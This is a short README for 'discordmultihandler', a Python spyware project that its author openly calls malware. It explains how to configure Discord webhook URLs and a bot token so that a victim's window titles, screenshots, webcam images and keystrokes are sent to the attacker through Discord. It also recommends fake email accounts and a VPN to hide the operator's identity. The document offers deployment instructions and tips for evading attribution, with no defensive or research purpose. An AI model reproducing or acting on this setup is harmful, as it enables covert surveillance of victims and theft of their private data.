# discordmultihandler
This is passive malware. you need to make a few changes to the code
```py
filenameforexe = "final file name (ex. discordmultihandler.exe)"
LURL = "webhooklink1"
LURL2 = "webhooklink2"
LURL3 = "webhooklink3"
path = "Path where the image will be saved"
```
Replace these values ​​with the ones that are relevant to what is listed.
## Description of this malware
This malicious code is a malicious code using Discord.
victimPC -> discord(webhook) -> attacker
This communication structure makes you more secretive.
For example, if you create Discord using a fake email address and use a vpn to log in, you can definitely hide yourself.
But it is not without its drawbacks. Because the victim's computer sends a one-way communication to the offender's computer, the assailant cannot command the victim's computer.
And because it is instantaneous communication, not continuous communication, instantaneous changes cannot be known. The information only comes according to a set tick.
But that's not a more valuable concern than a security threat.
The main features of this malware are that it can get the title of the window being used by the victim computer, get the screen and get the cam. Keylogs are of course also possible
### R_handler
This is a tool that manages malware.
There are also things that need to be corrected.
```py
bot.run('bot token here')
```
it's on the last line
